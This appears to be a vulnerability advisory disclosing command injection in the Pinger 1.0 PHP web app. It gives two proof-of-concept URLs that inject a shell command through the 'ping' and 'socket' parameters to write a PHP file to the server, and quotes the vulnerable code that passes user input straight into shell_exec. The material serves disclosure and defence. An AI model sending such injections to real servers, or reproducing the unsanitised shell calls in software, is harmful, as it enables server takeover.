@@ -1,0 +1,75 @@
+# Title: Pinger 1.0 - Remote Code Execution
+# Date: 2020-04-13
+# Author: Milad Karimi
+# Vendor Homepage: https://github.com/wcchandler/pinger
+# Software Link: https://github.com/wcchandler/pinger
+# Tested on: windows 10 , firefox
+# Version: 1.0
+# CVE : N/A
+
+================================================================================
+Pinger 1.0 - Simple Pinging Webapp Remote Code Execution
+================================================================================
+# Vendor Homepage: https://github.com/wcchandler/pinger
+# Software Link: https://github.com/wcchandler/pinger
+# Date: 2020.04.13
+# Author: Milad Karimi
+# Tested on: windows 10 , firefox
+# Version: 1.0
+# CVE : N/A
+================================================================================
+# Description:
+simple, easy to use jQuery frontend to php backend that pings various
+devices and changes colors from green to red depending on if device is
+up or down.
+
+# PoC :
+
+http://localhost/pinger/ping.php?ping=;echo '<?php phpinfo(); ?>' >info.php
+http://localhost/pinger/ping.php?socket=;echo '<?php phpinfo(); ?>' >info.php
+
+
+# Vulnerabile code:
+
+    if(isset($_GET['ping'])){
+      // if this is ever noticably slower, i'll pass it stuff when called
+      // change the good.xml to config.xml, good is what I use at $WORK
+      $xml = simplexml_load_file("config.xml");
+      //$xml = simplexml_load_file("good.xml");
+      if($_GET['ping'] == ""){
+        $host = "127.0.0.1";
+      }else{
+        $host = $_GET['ping'];
+      }
+      $out = trim(shell_exec('ping -n -q -c 1 -w '.$xml->backend->timeout
+                  .' '.$host.' | grep received | awk \'{print $4}\''));
+      $id = str_replace('.','_',$host);
+
+      if(($out == "1") || ($out == "0")){
+        echo json_encode(array("id"=>"h$id","res"=>"$out"));
+      }else{
+        ## if it returns nothing, assume network is messed up
+        echo json_encode(array("id"=>"h$id","res"=>"0"));
+      }
+    }
+
+    if(isset($_GET['socket'])){
+      $xml = simplexml_load_file("config.xml");
+      //$xml = simplexml_load_file("good.xml");
+      if($_GET['socket'] == ""){
+        $host = "127.0.0.1 80";
+      }else{
+        $host = str_replace(':',' ',$_GET['socket']);
+      }
+      $out = shell_exec('nc -v -z -w '.$xml->backend->timeout.' '.$host.' 2>&1');
+      $id = str_replace('.','_',$host);
+      $id = str_replace(' ','_',$id);
+      if(preg_match("/succeeded/",$out)){
+        echo json_encode(array("id"=>"h$id","res"=>"1"));
+      }else{
+        ## if it returns nothing, assume network is messed up
+        echo json_encode(array("id"=>"h$id","res"=>"0"));
+      }
+    }
+
+    ?>
